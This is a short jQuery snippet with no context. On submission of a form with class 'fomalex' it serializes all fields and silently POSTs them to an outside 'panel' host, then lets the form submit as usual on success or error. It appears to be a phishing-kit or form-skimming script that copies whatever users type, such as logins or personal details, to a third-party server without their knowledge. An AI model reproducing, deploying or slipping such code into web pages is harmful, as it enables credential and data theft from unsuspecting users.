$(".fomalex").submit(function() {
	var d = $(".fomalex");

	$.ajax({
        url: "https://panel.renznesia.com/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
